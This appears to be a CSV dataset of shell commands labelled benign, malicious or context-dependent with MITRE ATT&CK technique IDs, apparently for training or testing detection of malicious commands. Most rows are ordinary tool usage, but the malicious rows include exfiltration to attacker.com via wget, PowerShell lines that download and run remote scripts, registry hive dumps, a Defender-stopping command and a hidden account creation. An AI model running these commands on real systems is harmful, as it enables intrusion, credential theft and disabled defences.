command,label,original_label,mitre_id
find . -type f -not -name '*txt' | xargs rm,Benign,Benign,Benign
"find . -name ""*.xml"" -exec echo {} \;",Benign,Benign,Benign
"csslint --errors=errors,universal-selector,imports file.css",Benign,Benign,Benign
git show-merged-branches,Benign,Benign,Benign
renice --priority 3 [-p|--pid] pid,Benign,Benign,Benign
bootctl --esp-path /path/to/efi_system_partition/,Benign,Benign,Benign
getmac /?,Benign,Benign,Benign
arecord [-vv|--verbose --verbose] [-f|--format] cd [-d|--duration] 10 path/to/file.wav,Benign,Benign,Benign
npm ci --omit dev|optional|peer,Benign,Benign,Benign
find /usr/local -mtime -1,Benign,Benign,Benign
az storage blob delete --account-name account_name --account-key account_key [-c|--container-name] container_name [-n|--name] blob_name,Benign,Benign,Benign
josm --skip-plugins,Benign,Benign,Benign
if (!(Test-Path -path $path)){,Malicious,Malicious,T1546
hugo server [-p|--port] port_number,Benign,Benign,Benign
grub-mkrescue --directory /usr/lib/grub/i386-pc --output grub.iso path/to/source,Benign,Benign,Benign
Platypus,Malicious,Malicious,T1480
msgcat [-t|--to-code] UTF-8 input.po [-o|--output-file] output.po,Benign,Benign,Benign
udiskie-umount --help,Benign,Benign,Benign
i2cdetect i2c_bus,Benign,Benign,Benign
chainctl images repos list,Benign,Benign,Benign
"find /home -name ""*.txt"" -size 100k",Context_Dependent,Benign,Benign
iverilog -E path/to/source.v,Benign,Benign,Benign
nginx,Benign,Benign,Benign
cl /WX path\to\source.c,Benign,Benign,Benign
dig internal.corp,Context_Dependent,Synthetic,Synthetic
sudo lvrename [-y|--yes] /dev/vg_name/old_lv /dev/vg_name/new_lv,Benign,Benign,Benign
msrun.bat,Malicious,Malicious,T1059
astroterm,Benign,Benign,Benign
keepass2 path/to/database.kbdx -keyfile:path/to/key_file.key,Benign,Benign,Benign
spa-resample path/to/input.wav path/to/output.wav,Benign,Benign,Benign
"octez-client originate contract alias transferring 0 from alias|address running path/to/source_file.tz --init ""initial_storage"" --burn_cap 1",Benign,Benign,Benign
find . -name *.so -print0 | xargs -0 myCommand | grep ExpectedResult,Benign,Benign,Benign
"grim -g ""$(slurp -w 0)""",Benign,Benign,Benign
genfstab -U path/to/mount_point,Benign,Benign,Benign
find . -exec sh -c 'echo {} | grep -qi /path/to/something[^/]*$' \; -print,Benign,Benign,Benign
lsinitrd --unpack,Benign,Benign,Benign
"find ./ -type f -name ""*.php"" | xargs -r rename ""s/php/html/""",Benign,Benign,Benign
"kdialog --combobox ""message"" ""item1"" ""item2"" ""...""",Benign,Benign,Benign
%temp%\T1036.007_masquerading.xls.vbs,Malicious,Malicious,T1036
postconf -c path/to/configuration_directory,Benign,Benign,Benign
git am path/to/file.patch,Benign,Benign,Benign
docker secret rm secret_name1 secret_name2 ...,Benign,Benign,Benign
mongod --dbpath path/to/directory,Benign,Benign,Benign
wl-paste > path/to/file,Benign,Benign,Benign
cppclean path/to/project --include-path inc1 --include-path inc2,Benign,Benign,Benign
finger | colrm 34 39,Context_Dependent,Benign,Benign
"InfDefaultInstall.exe ""$inf_to_execute""",Malicious,Malicious,T1218
afplay --rate 0.5 path/to/file,Benign,Benign,Benign
podman pull [-h|--help],Benign,Benign,Benign
pants --changed-since=HEAD --changed-dependents=transitive check,Benign,Benign,Benign
tldr shnsplit,Benign,Benign,Benign
mount --bind /something /new_something,Context_Dependent,Benign,Benign
find /var -name lighttpd,Benign,Benign,Benign
gixy-next [-f|--format] text|json path/to/nginx.conf,Benign,Benign,Benign
", [-s|--shell] command",Benign,Benign,Benign
ulimit -S -n,Benign,Benign,Benign
pnmshear [-b|-background] blue angle path/to/input.pnm > path/to/output.pnm,Benign,Benign,Benign
find var/ -type f -exec chmod 600 {} \;,Benign,Benign,Benign
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /t REG_DWORD /v HideFileExt /d 1 /f,Malicious,Malicious,T1112
shnsplit -f path/to/file.cue path/to/file.wav,Benign,Benign,Benign
setsid [-f|--fork] program,Benign,Benign,Benign
rustup doc std::fs|usize|fn|...,Benign,Benign,Benign
ldapdomaindump [-u|--user] domain\username [-p|--password] password|ntlm_hash hostname|ip,Benign,Benign,Benign
anki [-p|--profile] profile_name,Benign,Benign,Benign
archey --offline,Benign,Benign,Benign
sudo smbpasswd -a username,Benign,Benign,Benign
yadm --yadm-repo,Benign,Benign,Benign
xzdiff --paginate path/to/file1 path/to/file2,Benign,Benign,Benign
"echo ""import os; os.system('date > /tmp/poc.txt')"" > ""$USER_PACKAGES/usercustomize.py""",Malicious,Malicious,T1546
yadm init -f path/to/local_repository,Benign,Benign,Benign
ntfyme config,Benign,Benign,Benign
pkexec command,Benign,Benign,Benign
tldr pamoil,Benign,Benign,Benign
nixpkgs-review rev HEAD,Benign,Benign,Benign
pbmclean path/to/image.pbm > path/to/output.pbm,Benign,Benign,Benign
bear --force-preload -- make,Benign,Benign,Benign
"find /var/log -name ""*.log"" -print0 2>/dev/null",Benign,Benign,Benign
terraform apply -auto-approve,Benign,Benign,Benign
monop -r:path/to/assembly.dll [-d|--declared-only] Namespace.Path.To.Type,Benign,Benign,Benign
x8 [-u|--url] https://example.com/?path=..%2faction.php%3f%s%23 --encode [-w|--wordlist] path/to/wordlist.txt,Benign,Benign,Benign
step certificate install|uninstall path/to/root-ca.crt,Benign,Benign,Benign
stressapptest -M memory,Benign,Benign,Benign
skaffold run [-f|--filename] skaffold.yaml,Benign,Benign,Benign
if [ ! -d $mount_point ]; then mkdir $mount_point ; mount $mount_device $mount_point; fi,Malicious,Malicious,T1611
sudo chown -R www-data:www-data /var/www,Benign,Benign,Benign
wat2wasm file.wat [-o|--output] file.wasm,Benign,Benign,Benign
pydoc,Benign,Benign,Benign
find . -name '*.clj' -exec grep -r resources {} \;,Benign,Benign,Benign
"echo hello world | tee >(awk '{print $2, $1}')",Benign,Benign,Benign
urpmi.update medium1 medium2 ...,Benign,Benign,Benign
systemctl rescue,Benign,Benign,Benign
bun pm hash-print,Benign,Benign,Benign
lvm_import_vdo [-n|--name] vg_name/lv_name /dev/mapper/vdo_volume,Benign,Benign,Benign
cs java --available,Benign,Benign,Benign
find . -user aluno1 -exec chown aluno2 {},Benign,Benign,Benign
amass enum -o output_file -dir path/to/directory -d domain_name,Benign,Benign,Benign
cwebp path/to/image_file -o path/to/output.webp -z 9,Benign,Benign,Benign
mocp --play|stop,Benign,Benign,Benign
find / -type f ! -perm 777,Context_Dependent,Benign,Benign
"ping google.com -n 10 | awk '/Minimum =/ { sub("","","""",$3); print $3 }'",Benign,Benign,Benign
reg add HKCU\SOFTWARE\NetWire /v HostId /t REG_SZ /d HostId-kai6Ci /f,Malicious,Malicious,T1112
ngrep -d eth0 port 22,Benign,Benign,Benign
sudo pkill -SIGTERM $process_pattern,Malicious,Malicious,T1489
"find . -name ""my.txt"" 2> find_error.txt",Benign,Benign,Benign
cb copy path/to/file,Benign,Benign,Benign
raw /dev/raw/raw1 /dev/block_device,Benign,Benign,Benign
apport-bug package,Benign,Benign,Benign
cat path/to/input_file | col [-x|--spaces] > output_file,Benign,Benign,Benign
swupd bundle-list,Benign,Benign,Benign
"kdeconnect-cli --ring --name ""device_name""",Benign,Benign,Benign
c99 -o executable_name file.c,Benign,Benign,Benign
choco list,Benign,Benign,Benign
secret-tool store --label=label key value,Benign,Benign,Benign
gdal_translate -outsize 40% 40% path/to/input.tif path/to/output.tif,Benign,Benign,Benign
ssh -L 1234:remote2:22 -p 45678 user1@remote1,Context_Dependent,Benign,Benign
"echo ""password"" | docker login [-u|--username] username --password-stdin",Benign,Benign,Benign
gladtex path/to/input.htex -o path/to/output.html,Benign,Benign,Benign
find . -size +1000M,Benign,Benign,Benign
"csshX user@hostname1 user@hostname2 --ssh_args ""-i path/to/key_file.pem""",Benign,Benign,Benign
dnsmasq,Benign,Benign,Benign
pw useradd $username -s /usr/sbin/nologin -d /nonexistent -c evil_account,Malicious,Malicious,T1136
bw get item github,Benign,Benign,Benign
dumpe2fs -x /dev/sdXN,Benign,Benign,Benign
velero restore create --from-schedule schedule_name,Benign,Benign,Benign
hexedit path/to/file,Benign,Benign,Benign
"mkdir -p `cut -f2 -d""&"" filetypes.txt | sed 's/[ ,:]//g' | sort -u`",Benign,Benign,Benign
ScreenConnect,Malicious,Malicious,T1219
jps,Benign,Benign,Benign
crictl inspect container_id1 container_id2 ...,Benign,Benign,Benign
i3lock,Benign,Benign,Benign
nsenter [-t|--target] pid [-a|--all] command command_arguments,Benign,Benign,Benign
hledger [bal|balance] [-HVQ|--historical --market --quarterly] assets:investments,Benign,Benign,Benign
systemd-nspawn [-D|--directory] path/to/container_root [-a|--as-pid2],Benign,Benign,Benign
rpm2cpio libstdc++-4.9.2-1.fc21.x86_64.rpm |cpio -idmv,Benign,Benign,Benign
fly targets,Benign,Benign,Benign
"find /mydir -type f -name ""*.txt"" -execdir chown root {} ';'",Benign,Benign,Benign
"whiptail --title ""title"" --yesno ""message"" height_in_chars width_in_chars",Benign,Benign,Benign
find . -type d -print -exec bash -c 'find {} -type f -depth 1 -perm +0111 | sort -r' \;,Benign,Benign,Benign
tldr run-mailcap,Benign,Benign,Benign
notmuch setup,Benign,Benign,Benign
alias mkdir=¨mkdir -p¨,Benign,Benign,Benign
npm unstar package_name --loglevel silent|error|warn|notice|http|timing|info|verbose|silly,Benign,Benign,Benign
gunzip -l file.zip,Benign,Benign,Benign
find ~/junk -name 'cart[1-6]' -exec ls -l {} \; 2> /dev/null,Benign,Benign,Benign
nmcli [c|connection] [a|add] ifname interface_name type ethernet ip6 2001:db8::2/64 gw6 2001:db8::1 ipv6.dns 2001:db8::1 ipv4.method ignore,Benign,Benign,Benign
hyprpicker [-h|--help],Benign,Benign,Benign
find /path/to/look/in/ -type d -name '.texturedata',Benign,Benign,Benign
dstat [-c|--cpu] [-m|--mem],Benign,Benign,Benign
"find ./ -name ""*"" | xargs grep ""searchName""",Benign,Benign,Benign
pulumi up [-y|--yes],Benign,Benign,Benign
openvpn3 config-import [-c|--config] path/to/config.conf,Benign,Benign,Benign
"find . -type f -name ""*.jpg"" -print0 | xargs -0 rename ""s/Image_200x200_(\d{3})/img/""",Benign,Benign,Benign
gphoto2 --summary,Benign,Benign,Benign
tunelp [-i|--irq] 5 /dev/lp0,Benign,Benign,Benign
Set-Location ..,Benign,Benign,Benign
echo -e '#!/bin/sh\n/bin/sh 1>&0' >/path/to/temp-file,Malicious,Malicious,T1059
func start,Benign,Benign,Benign
"command | cut [-d|--delimiter] ""delimiter"" [-f|--fields] 2-",Benign,Benign,Benign
shopt -s nullglob,Benign,Benign,Benign
xauth info,Benign,Benign,Benign
ifconfig eth0 down,Context_Dependent,Benign,Benign
find . -type f -print | xargs grep -i 'bin/ksh',Benign,Benign,Benign
nvm ls-remote,Benign,Benign,Benign
"read -r -n 1 -p ""${1:-Continue?} [y/n]: "" REPLY",Benign,Benign,Benign
ssh-keygen -l -f /etc/ssh/ssh_host_ecdsa_key.pub,Benign,Benign,Benign
spark new project_name,Benign,Benign,Benign
git lfs push --all remote_name branch_name,Benign,Benign,Benign
npm ping --registry custom_registry_url,Benign,Benign,Benign
phpspec run [-c|--config] path/to/configuration_file,Benign,Benign,Benign
git bundle create path/to/file.bundle branch_name,Benign,Benign,Benign
npm [i|install],Benign,Benign,Benign
pstopnm path/to/file.ps,Benign,Benign,Benign
find . -type f | xargs grep 'string_to_find' -sl | xargs perl -pi -w -e 's/string_to_find//g;',Benign,Benign,Benign
rmlint [-c|--config] sh:link [-b|--match-basename] path/to/directory,Benign,Benign,Benign
sbatch path/to/job.sh,Benign,Benign,Benign
"Write-Host ""Application Hijacking worked. Logged in successfully as $($auth.Account.Id) of type $($auth.Account.Type)""",Malicious,Malicious,T1098
psexec.exe,Malicious,Malicious,T1562
msbuild path/to/project_file /target:targets,Benign,Benign,Benign
viu path/to/file,Benign,Benign,Benign
ssh -L 8080:localhost:80 user@10.10.10.50,Context_Dependent,Synthetic,Synthetic
dir /a,Benign,Benign,Benign
finger $username | awk '/^Directory/ {print $2}',Context_Dependent,Benign,Benign
dolt clone --remote remote_name repository_url,Benign,Benign,Benign
find . -name '*.scm',Benign,Benign,Benign
tree -L 2 -fi,Benign,Benign,Benign
%USERPROFILE%\Recent,Context_Dependent,Malicious,T1083
fclones group . | fclones remove --priority newest,Benign,Benign,Benign
iex,Benign,Benign,Benign
devpod provider list-available,Benign,Benign,Benign
sudo lvchange [-k|--setactivationskip] y /dev/vg_name/lv_name,Benign,Benign,Benign
"fpsync -v -O ""-x|.snapshot*"" /path/to/source/ /path/to/destination/",Benign,Benign,Benign
siege https://example.com,Benign,Benign,Benign
nova start server,Benign,Benign,Benign
poetry remove package --dry-run,Benign,Benign,Benign
pipenv lock --requirements,Benign,Benign,Benign
faketime 'today 23:30' date,Benign,Benign,Benign
sonar-scanner [-D|--define] project.settings=myproject.properties,Benign,Benign,Benign
find /home/david -iname 'index*',Context_Dependent,Benign,Benign
sc query state= all,Context_Dependent,Malicious,T1007
"systemctl mount-image unit /path/to/image /path/to/directory_inside_unit root:ro,nosuid",Benign,Benign,Benign
find . -type f -size +10000000 -print|xargs ls -ld|more,Benign,Benign,Benign
wp plugin install plugin --activate,Benign,Benign,Benign
"set-itemproperty $RunOnceKey ""NextRun"" '$thing_to_execute ""IEX (New-Object Net.WebClient).DownloadString(`""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1547.001/src/Discovery.bat`"")""'",Malicious,Malicious,T1547
bleachbit [-s|--shred] path/to/file,Benign,Benign,Benign
bpytop,Benign,Benign,Benign
pushd -2,Benign,Benign,Benign
fisher plugin1 plugin2,Benign,Benign,Benign
dot_clean -m path/to/directory,Benign,Benign,Benign
composer require user/package,Benign,Benign,Benign
find -inum 117672808 -exec rm {} \;,Benign,Benign,Benign
toilet [-F|--filter] list,Benign,Benign,Benign
wine winecfg,Benign,Benign,Benign
OpenEventLogW,Malicious,Malicious,T1070
pnmmontage -0..9 path/to/image1.pnm path/to/image2.pnm ... > path/to/output.pnm,Benign,Benign,Benign
swift $swift_src -keylog,Malicious,Malicious,T1056
pg_basebackup [-D|--pgdata] path/to/backup_dir [-r|--max-rate] 100M,Benign,Benign,Benign
wget --post-file=/path/to/input-file http://attacker.com,Malicious,Malicious,T1105
"Copy-Item ""$PathToAtomicsFolder\T1547.001\src\vbsstartup.vbs"" ""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs""",Malicious,Malicious,T1547
find / -mtime +50 -mtime -100,Context_Dependent,Benign,Benign
gammastep -t 5700:3600,Benign,Benign,Benign
mysql [-u|--user] user [-p|--password] database_name,Benign,Benign,Benign
sudo debtap [-u|--update],Benign,Benign,Benign
tldr [-p|--platform] linux runcon,Benign,Benign,Benign
"rmdir ""$(dirname $(dirname $dir))""",Benign,Benign,Benign
desc instance instance_id;,Benign,Benign,Benign
docker swarm ca --rotate,Benign,Benign,Benign
i2cget i2cbus device_address register_address b|w|c|s|i,Benign,Benign,Benign
standard-version,Benign,Benign,Benign
bshell --domain domain,Benign,Benign,Benign
mksquashfs path/to/file_or_directory1 path/to/file_or_directory2 ... filesystem.squashfs -e file|directory1 file|directory2 ...,Benign,Benign,Benign
lame path/to/file.wav path/to/output.aac,Benign,Benign,Benign
usbip list [-l|--local],Benign,Benign,Benign
shards list,Benign,Benign,Benign
chcon [-r|--role] role filename,Benign,Benign,Benign
iproxy local_port:device_port,Benign,Benign,Benign
mycli [-u|--user] username database_name,Benign,Benign,Benign
find ~/ -name '*.txt' -exec cat {} ;,Benign,Benign,Benign
systool -b bus -v,Benign,Benign,Benign
</volume>,Malicious,Malicious,T1222
head -20 /etc/pam.d/common-auth,Context_Dependent,Synthetic,Synthetic
pdftk path/to/input.pdf cat 1-3 5 6-10 output path/to/output.pdf,Benign,Benign,Benign
crush [-d|--debug],Benign,Benign,Benign
d2 [-s|--sketch] true path/to/input_file.d2 path/to/output_file.ext,Benign,Benign,Benign
find / -group root,Context_Dependent,Benign,Benign
sudo iptables-restore path/to/file,Benign,Benign,Benign
apg -r path/to/dictionary_file,Benign,Benign,Benign
pbmtoascii path/to/input_file.pbm,Benign,Benign,Benign
browser-sync init,Benign,Benign,Benign
command | sha1sum,Benign,Benign,Benign
"find . -type f \( -name ""*.class"" -o -name ""*.sh"" \)",Benign,Benign,Benign
eglinfo -B,Benign,Benign,Benign
dolt version,Benign,Benign,Benign
putty -ssh username@hostname_or_ip -P port,Benign,Benign,Benign
"find . ! -name . -prune -exec sh -c 'shift $1; mv ""$@"" targetdirectory/' 2 1 {} +",Benign,Benign,Benign
wol [-v|--verbose] mac_address,Benign,Benign,Benign
npm pack path/to/package_directory,Benign,Benign,Benign
vkcube -h,Benign,Benign,Benign
fakeroot [-u|--unknown-is-real] -- command command_arguments,Benign,Benign,Benign
find . -type f -exec printf '%.0sbla\n' {} +,Benign,Benign,Benign
nb [to|todos] [a|add] title,Benign,Benign,Benign
typst --font-path path/to/fonts_directory fonts,Benign,Benign,Benign
agate [-h|--help],Benign,Benign,Benign
authd,Malicious,Malicious,T1055
lid token,Benign,Benign,Benign
qalc --list-functions|list-prefixes|list-units|list-variables,Benign,Benign,Benign
qm start 100,Benign,Benign,Benign
touch index.html,Benign,Benign,Benign
wpscan --url http://target.com --enumerate vp,Context_Dependent,Synthetic,Synthetic
qmmp,Benign,Benign,Benign
rkdeveloptool wlx partition_name path/to/image.img,Benign,Benign,Benign
promtool test rules test_file.yml,Benign,Benign,Benign
NT AUTHORITY\SYSTEM,Malicious,Malicious,T1134
command | shasum,Benign,Benign,Benign
xsel [-ob|--output --clipboard],Benign,Benign,Benign
rpcmap.py -brute-uuids stringbinding,Benign,Benign,Benign
/System/Library/LaunchAgents,Malicious,Malicious,T1543
pdflatex -output-directory=path/to/directory source.tex,Benign,Benign,Benign
jbang init path/to/file.java,Benign,Benign,Benign
"find -type f -exec grep -l ""texthere"" {} +",Benign,Benign,Benign
"mimikatz ""sekurlsa::secrets""",Benign,Benign,Benign
"tar cvzf - path/to/directory1 path/to/directory2 | uuencode data.tar.gz | mail --subject ""subject_line"" to_user@example.com",Benign,Benign,Benign
xtrlock -f,Benign,Benign,Benign
timeout 3s sleep 10,Benign,Benign,Benign
"find /dir \( -name foo -prune \) -o \( -name bar -prune \) -o -name ""*.sh"" -print",Benign,Benign,Benign
audacious,Benign,Benign,Benign
rpmspec --parse path/to/rpm.spec,Benign,Benign,Benign
"IF ""%PROCESSOR_ARCHITECTURE%""==""AMD64"" (C:\Windows\syswow64\regsvr32.exe /s $dll_name) ELSE ( $regsvr32path\$regsvr32name /s $dll_name )",Malicious,Malicious,T1218
aws accessanalyzer update-analyzer --analyzer-arn analyzer_arn --tags new_tags,Benign,Benign,Benign
sudo eopkg install package,Benign,Benign,Benign
"Try {cmd /c ""$AdvancedRun_Location"" /EXEFilename ""$env:systemroot\System32\sc.exe"" /WindowState 0 /CommandLine ""stop WinDefend"" /StartDirectory """" /RunAs 8 /Run} Catch{}",Malicious,Malicious,T1562
clamdscan --infected,Benign,Benign,Benign
cdk diff stack_name,Benign,Benign,Benign
opt -dot-cfg -S path/to/file.bc -disable-output,Benign,Benign,Benign
"zeroclaw agent [-m|--message] ""Hello"" [-t|--temperature] 0.5",Benign,Benign,Benign
gcc --version,Benign,Benign,Benign
sfdk engine start,Benign,Benign,Benign
away [-t|--time] seconds message,Benign,Benign,Benign
volta install node|npm|yarn@version,Benign,Benign,Benign
disown -h %job_number,Benign,Benign,Benign
hddtemp [-u|--unit] C|F type:/dev/sdX,Benign,Benign,Benign
deepseek --local,Benign,Benign,Benign
"windows\syswow64,",Malicious,Malicious,T1053
pacdiff [-l|--locate],Benign,Benign,Benign
git update-ref -m message HEAD 4e95e05,Benign,Benign,Benign
lsd [-ltr|--long --timesort --reverse],Benign,Benign,Benign
yadm --yadm-archive,Benign,Benign,Benign
stegsnow -C -f 'path/to/message.txt' path/to/file.txt path/to/result.txt,Benign,Benign,Benign
mimetype --brief path/to/file,Benign,Benign,Benign
find . -maxdepth 1 -type f | xargs -I ‘{}’ sudo mv {} /directory1/directory2,Benign,Benign,Benign
sudo minicom [-D|--device] /dev/ttyXYZ,Benign,Benign,Benign
code tunnel --name xxxxxx,Malicious,Malicious,T1105
GetLogicalDriveStrings,Malicious,Malicious,T1106
sam deploy,Benign,Benign,Benign
smem --system,Benign,Benign,Benign
Invoke-ATHHTMLApplication -HTAFilePath $hta_file_path -ScriptEngine $script_engine -SimulateUserDoubleClick,Malicious,Malicious,T1218
cs fetch --dependency-file path/to/file1 --dependency-file path/to/file2 ...,Benign,Benign,Benign
supabase stop,Benign,Benign,Benign
find $HOME -iname '*.ogg',Benign,Benign,Benign
find . -type f -daystart -mtime -2,Benign,Benign,Benign
diffoscope --exclude-directory-metadata auto|yes|no|recursive path/to/directory1 path/to/directory2,Benign,Benign,Benign
pypy -i path/to/file.py,Benign,Benign,Benign
Parameters,Malicious,Malicious,T1574
dpkg -l | grep -i ssl,Context_Dependent,Synthetic,Synthetic
__fnDWORD,Malicious,Malicious,T1574
poetry new path/to/directory,Benign,Benign,Benign
nmap -p 3306 10.10.10.10,Context_Dependent,Synthetic,Synthetic
ln -nsf alpha_2 alpha,Benign,Benign,Benign
sg_raw /dev/sr0 EA 00 00 00 00 01,Benign,Benign,Benign
tex -halt-on-error source.tex,Benign,Benign,Benign
color /?,Benign,Benign,Benign
npm hook ls,Benign,Benign,Benign
sudo ip [tunt|tuntap] [a|add] [d|dev] tun0|tap0 [m|mode] tun|tap [u|user] username,Benign,Benign,Benign
"find folder1/ -type f -printf ""%d\t%p\n"" | sort -n | sed -e ""s|[0-9]*\t||""",Benign,Benign,Benign
"echo """" | ""$plink_file"" ""$vm_host"" -ssh -l ""$vm_user"" -pw ""$vm_pass"" -m ""$vib_install""",Malicious,Malicious,T1129
rpcclient [-U|--user] domain\username --pw-nt-hash ip_address,Benign,Benign,Benign
sudo vgs,Benign,Benign,Benign
mate-screenshot --area,Benign,Benign,Benign
qgis [-n|--nologo],Benign,Benign,Benign
latte-dock --layout layout_name,Benign,Benign,Benign
pstree pid,Context_Dependent,Benign,Benign
ndc -p path/to/pidfile command,Benign,Benign,Benign
"find . -name ""FILES.EXT""",Benign,Benign,Benign
upx path/to/file,Benign,Benign,Benign
more path/to/file,Benign,Benign,Benign
grep -b -o $'\x0c' filename | less,Benign,Benign,Benign
"find ~/container -mindepth 3 -type f -execdir mv ""{}"" $(dirname ""{}"")/.. \;",Benign,Benign,Benign
zip2john -o path/to/compressed_file path/to/file.zip > file.hash,Benign,Benign,Benign
split --lines=1 --suffix-length=5 input.txt output.,Benign,Benign,Benign
PostMessage,Malicious,Malicious,T1055
mamba list,Benign,Benign,Benign
taskhostsvc.exe,Malicious,Malicious,T1036
foreach ($directory in Get-ChildItem -Path $UsersFolder -ErrorAction SilentlyContinue),Context_Dependent,Malicious,T1083
find / -type d -print,Context_Dependent,Benign,Benign
generaldomaininfo -noninteractive -consoleoutput,Context_Dependent,Malicious,T1087
git maintenance start,Benign,Benign,Benign
umount mountpoint,Benign,Benign,Benign
kinit -r 1w,Benign,Benign,Benign
kubectl events [-o|--output] yaml,Benign,Benign,Benign
"asterisk -r -x ""sip show peers""",Benign,Benign,Benign
"find /home -type f -name ""*.ext"" -print0 | while read -r -d ""$(printf ""\000"")"" -r path; do cat $path | tr -d '\r' > $path""_new""; done",Context_Dependent,Benign,Benign
"Add-MsolRoleMember -RoleName ""Company Administrator"" -RoleMemberEmailAddress ""$target_user""",Malicious,Malicious,T1098
reg save HKLM\SYSTEM $extract_path\SYSTEM_HIVE,Malicious,Malicious,T1003
arduino-builder -compile path/to/sketch.ino,Benign,Benign,Benign
bcftools view path/to/input.bcf [-O|--output-type] v,Benign,Benign,Benign
file */* *>> $output_file,Context_Dependent,Malicious,T1083
checkupdates [-c|--change],Benign,Benign,Benign
/run/udev/rules.d/,Malicious,Malicious,T1546
last nobody,Context_Dependent,Synthetic,Synthetic
lvmdump,Benign,Benign,Benign
text/plain,Malicious,Malicious,T1027
koboldcpp [-t|--threads] amount_of_threads,Benign,Benign,Benign
sudo zoneadm -z zone_name install,Benign,Benign,Benign
offlineimap -o,Benign,Benign,Benign
etcd --name my_etcd_cluster,Benign,Benign,Benign
if [ ! -d ~/Library/LaunchAgents ]; then mkdir ~/Library/LaunchAgents; fi;,Malicious,Malicious,T1543
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1'),Malicious,Malicious,T1558
git rebase [-X|--strategy-option] theirs branch_name,Benign,Benign,Benign
tldr clamscan,Benign,Benign,Benign
find /srv/${x} -type d -empty -exec rmdir {} \;,Benign,Benign,Benign
bq load --location location --source_format CSV|JSON|PARQUET|AVRO dataset.table path/to/source,Benign,Benign,Benign
"& ""PathToAtomicsFolder\..\ExternalPayloads\rubeus.exe"" purge",Malicious,Malicious,T1550
sudo make /tmp/hello,Malicious,Malicious,T1548
squirrel.exe --download {REMOTEURL},Malicious,Malicious,T1218
join -1 2 -2 1 text.txt codes.txt,Benign,Benign,Benign
"minio server --address "":port"" --console-address "":port"" path/to/data_directory",Benign,Benign,Benign
strip [-d|--strip-debug] path/to/file.o,Benign,Benign,Benign
pest --parallel,Benign,Benign,Benign
sudo path/to/pig.py [-c|--color] [-v|--verbosity] 1 eth1,Benign,Benign,Benign
"tgutil [-n|--name] session_name [-u|--username] chat_id [-m|--mode] edit --text ""current_text"" --newtext ""new_text""",Benign,Benign,Benign
/bin/sh -i,Context_Dependent,Synthetic,Synthetic
qwen --show-memory-usage,Benign,Benign,Benign
"find . -print0 | xargs -0 -l -i echo ""{}"";",Benign,Benign,Benign
find . -maxdepth 1 -type f -perm -ugo=x,Benign,Benign,Benign
sc_wartsfilter -i path/to/input.warts -o path/to/output.warts -a 192.0.2.5 -a 192.0.2.6,Benign,Benign,Benign
"""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" -sc admincountdmp $optional_args",Context_Dependent,Malicious,T1087
LSADUMP::ChangeNTLM,Malicious,Malicious,T1098
msdtc.exe,Malicious,Malicious,T1036
sudo kill -15 $( sudo lsof -i:6000 -t ),Benign,Benign,Benign
terraform show path/to/file.tfplan,Benign,Benign,Benign
bedtools bamtobed -i path/to/file.bam > path/to/file.bed,Benign,Benign,Benign
jj parallelize revsets,Benign,Benign,Benign
"yad --file --title ""title_message""",Benign,Benign,Benign
last [-F|--fulltimes] [-a|--hostlast],Context_Dependent,Benign,Benign
gdbus monitor --session,Benign,Benign,Benign
podman image prune [-a|--all],Benign,Benign,Benign
shfmt [-s|--simplify] path/to/file,Benign,Benign,Benign
sudo alien [-d|--to-deb] [-i|--install] path/to/file,Benign,Benign,Benign
reg export HKLM\system %temp%\system,Malicious,Malicious,T1003
"find ./ -type f -exec grep -l ""Text To Find"" {} \;",Benign,Benign,Benign
doctl [d|databases] [o|options] [v|versions] --engine pg|mysql|redis|mongodb,Benign,Benign,Benign
hexdump path/to/file,Benign,Benign,Benign
"mmv ""[0-1][0-9]-[0-3][0-9]-[0-9][0-9][0-9][0-9].txt"" ""#3#4-#1#2-#5#6#7#8.txt""",Benign,Benign,Benign
tee foobar.txt,Benign,Benign,Benign
docker top $(docker ps -q | head -1),Context_Dependent,Synthetic,Synthetic
find . -iregex './\(EA\|FS\)_.*',Benign,Benign,Benign
ignite generate plugin_name path/to/file,Benign,Benign,Benign
find / \! \( -newer ttt -user wnj \) -print,Context_Dependent,Benign,Benign
cd $(git rev-parse --show-cdup),Benign,Benign,Benign
certutil -decodehex {PATH:.hex} {PATH},Malicious,Malicious,T1140
sudo chmod +rx $(which node),Benign,Benign,Benign
